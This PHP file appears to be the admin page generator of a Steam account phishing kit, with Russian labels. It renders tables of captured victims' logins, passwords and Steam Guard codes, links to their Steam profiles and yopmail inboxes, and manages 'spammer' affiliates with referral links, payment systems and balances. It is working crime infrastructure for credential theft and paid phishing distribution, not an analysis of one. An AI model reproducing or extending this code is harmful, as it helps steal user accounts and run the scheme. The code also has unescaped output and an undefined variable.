<?php
require_once("classPanel.php");

	class PageGenerator {
		private $PathToTemplate;
		
		function __construct($PathToTemplate){
			$this->PathToTemplate = $PathToTemplate;
		}
		
		private function _generatePage($head, $content) {
			$layout = file_get_contents($this->PathToTemplate . "/layout.html");
			$Panel = new classPanel();
			
			$page = str_replace
			(
				array("%head%", "%admin_login%", "%content%"),
				array($head, $Panel->s_GetAdminLogin(), $content),
				$layout
			);
			
			return $page;
		}
		
		public function GenerateIndex(){
			$head = 
			"
			<style>
				::-webkit-scrollbar {
				width: 10px; /** width of total scrollbar **/
				background: #fff; /** background of scrollbar **/
				border: 1px solid #000; /** border around whole scrollbar **/
				}

				::-webkit-scrollbar-thumb {
				background: rgba(0, 0, 0, 0.5); /** color of the moving part of the scrollbar (thumb) **/
				border: 1px solid #000; /** border around moving part of scrollbar (overlaps with border of total scrollbar) **/
				}
			</style>
			";
			
			$content = file_get_contents($this->PathToTemplate . "/pages/main.html");
			
			$Panel = new classPanel();
			
			if ($Panel->b_AccountsExist()) {
				/*
				 *     TABLE
				 */
				
				$table_tpl = 
				'
							<table id="data-table" class="table dataTable no-footer" role="grid" aria-describedby="data-table_info">
                                <thead>
                                    <tr role="row">
										<th>Логин</th>
										<th>Пароль</th>
										<th>Steam Guard</th>
                                        <th>Почта</th>
										<th>Ссылка</th>
										<th>Время</th>
										<th>Спамер</th>
										<th class="text-center">Действия</th>
									</tr>
                                </thead>
                                <tbody>
									%table_content%
								</tbody>
                            </table>
				';
				
				$row_tpl = 
				'
								<tr id="row-%id%" role="row" class="odd" >
									<td class="log" > 
										<a href="javascript:copyToClipBoard(\'#row-%id% .log span\')"><i class="zmdi zmdi-copy"></i></a>
										<span>%login%</span>
									</td>
									<td class="pass" >
										<a href="javascript:copyToClipBoard(\'#row-%id% .pass span\')"><i class="zmdi zmdi-copy"></i></a>
										<span>%password%</span>
									</td>
									<td class="guard" > 
										<a href="javascript:copyToClipBoard(\'#row-%id% .guard span\')"><i class="zmdi zmdi-copy"></i></a>
										<span>%guard%</span>
									</td>
                                    									<td class="mail" >
										<a href="http://www.yopmail.com/ru/?%login%" target="_blank">%login%</a>
									</td>
									<td><a href="http://steamcommunity.com/profiles/%steamid%" target="_blank">Профиль</a></td>
									<td>%time%</td>
									<td>%spamer%</td>
									<td class="text-center">

										<div class="dropdown hidden-xs-down">
											%valid%
											<a href="/admin/delete?id=%id%"><i class="zmdi zmdi-delete"></i></a>
											<a href="javascript:setPassword(%id%)"><i class="zmdi zmdi-edit"></i></a>
										</div>

									</td>
								</tr>
				';
				
				$rows = "";
				$accounts = $Panel->arr_GetAccounts();
				
				for ($i = 0; $i < count($accounts); $i++) {
					if ($accounts[$i]["status"] == 0) $valid = "<a href='/admin/toggleValid?id=%id%'><i class='zmdi zmdi-check'></i></a>";
					else $valid = "<a href='/admin/toggleValid?id=%id%'><i class='zmdi zmdi-close'></i></a>";
					
					$rows .= str_replace
					(
						array("%login%", "%password%", "%guard%", "%steamid%", "%time%", "%spamer%", "%valid%", "%id%"),
						array(
							
							$accounts[$i]["login"], 
							$accounts[$i]["password"], 
							$accounts[$i]["guard"], 
							$accounts[$i]["steamid"], 
							date("H:i", $accounts[$i]["time"]),
							$accounts[$i]["spammer"],
							$valid,
							$accounts[$i]["id"]
						),
						$row_tpl
					);
				}
				
				$table = str_replace("%table_content%", $rows, $table_tpl);
				/*
				 *     /TABLE
				 */
				 
				$content = str_replace
				(
					array("%table%", "%visits%", "%total_logs%", "%total_sum%"),
					array($table, $Panel->int_GetVisits(), count($accounts), $Panel->int_getTotalSum()),
					$content
				);
			}
			else {
				$content = str_replace
				(
					array("%table%", "%visits%", "%total_logs%", "%total_sum%"),
					array('<p class="text-center">Нет аккаунтов в базе</p>', $Panel->int_GetVisits(), count($accounts), $Panel->int_getTotalSum()),
					$content
				);
			}
			
			$Page = self::_generatePage($head, $content);
			return $Page;
		}
		
		public function GenerateSpammers($error){
			$head = 
			"
			<style>
				::-webkit-scrollbar {
				width: 10px; /** width of total scrollbar **/
				background: #fff; /** background of scrollbar **/
				border: 1px solid #000; /** border around whole scrollbar **/
				}

				::-webkit-scrollbar-thumb {
				background: rgba(0, 0, 0, 0.5); /** color of the moving part of the scrollbar (thumb) **/
				border: 1px solid #000; /** border around moving part of scrollbar (overlaps with border of total scrollbar) **/
				}
			</style>
			";
			
			$content = file_get_contents($this->PathToTemplate . "/pages/spammers.html");
			
			$error_notice = '
				<div class="card">
					<div class="card-body">
						<center>Введенный логин уже занят!</center>
					</div>
				</div>
			';
			
			if ($error === 1) $content = $error_notice . $content;
			
			$Panel = new classPanel();
			
			if ($Panel->b_SpammersExist()) {
				/*
				 *     TABLE
				 */
				
				$table_tpl = 
				'
							<table id="data-table" class="table dataTable no-footer" role="grid" aria-describedby="data-table_info">
                                <thead>
                                    <tr role="row">
										<th>Логин</th>
										<th>Пароль</th>
										<th>Реф-ссылка</th>
										<th>Платежная система</th>
										<th>Баланс</th>
										<th class="text-center">Действия</th>
									</tr>
                                </thead>
                                <tbody>
									%table_content%
								</tbody>
                            </table>
				';
				
				$row_tpl = 
				'
								<tr id="row-%id%" role="row" class="odd" >
									<td class="log" > 
										<a href="javascript:copyToClipBoard(\'#row-%id% .log span\')"><i class="zmdi zmdi-copy"></i></a>
										<span>%login%</span>
									</td>
									<td class="pass" >
										<a href="javascript:copyToClipBoard(\'#row-%id% .pass span\')"><i class="zmdi zmdi-copy"></i></a>
										<span>%password%</span>
									</td>
									<td class="ref-link" >
										<a href="javascript:copyToClipBoard(\'#row-%id% .ref-link span\')"><i class="zmdi zmdi-copy"></i></a>
										<span>%ref-link%</span>
									</td>
									<td class="payment_system" >%payment_system%</td>
									<td class="payment_system" >%balance%</td>
									<td class="text-center">

										<div class="dropdown hidden-xs-down">
											<a href="javascript:setBalance(%id%)"><i class="zmdi zmdi-balance-wallet"></i></a>
											<a href="javascript:resetBalance(%id%)"><i class="zmdi zmdi-close"></i></a>
											<a href="/admin/delSpamer?id=%id%"><i class="zmdi zmdi-delete"></i></a>
										</div>

									</td>
								</tr>
				';
				
				$rows = "";
				$spammers = $Panel->arr_GetSpammers();
				
				for ($i = 0; $i < count($spammers); $i++) {
					$rows .= str_replace
					(
						array("%login%", "%password%", "%ref-link%", "%payment_system%", "%balance%", "%id%"),
						array(
							$spammers[$i]["login"], 
							$spammers[$i]["password"],
							$_SERVER["SERVER_NAME"] . "/?ref=" . $spammers[$i]["login"],
							$spammers[$i]["payment_system"],
							$spammers[$i]["balance"],
							$spammers[$i]["id"]
						),
						$row_tpl
					);
				}
				
				$table = str_replace("%table_content%", $rows, $table_tpl);
				/*
				 *     /TABLE
				 */
				 
				$content = str_replace
				(
					array("%table%"),
					array($table),
					$content
				);
			}
			else {
				$content = str_replace
				(
					array("%table%"),
					array('<p class="text-center">Нет спамеров в базе</p>'),
					$content
				);
			}
			
			$Page = self::_generatePage($head, $content);
			return $Page;
		}
		
		public function GenerateSettings(){
			$content = file_get_contents($this->PathToTemplate . "/pages/settings.html");
			$Panel = new classPanel();
			
			$settings = $Panel->arr_GetSettings();
			$settings_content = "";
			
			foreach ($settings as $key => $setting) {
				if ($setting["name"] == "visits") continue;
				$settings_content .= '
				<div class="form-group">
					<label for="'.$setting["name"].'">'.$setting["normalName"].'</label>
					<input type="text" name="'.$setting["name"].'" id="'.$setting["name"].'" class="form-control" placeholder="'.$setting["normalName"].'" value="'.$setting["value"].'">
				</div>
				';
			}
			
			$content = str_replace("%settings_content%", $settings_content, $content);
			
			$Page = self::_generatePage("", $content);
			return $Page;
		}
		
		public function GenerateAuth(){
			$Page = file_get_contents($this->PathToTemplate . "/pages/auth.html");
			
			return $Page;
		}
	}
?>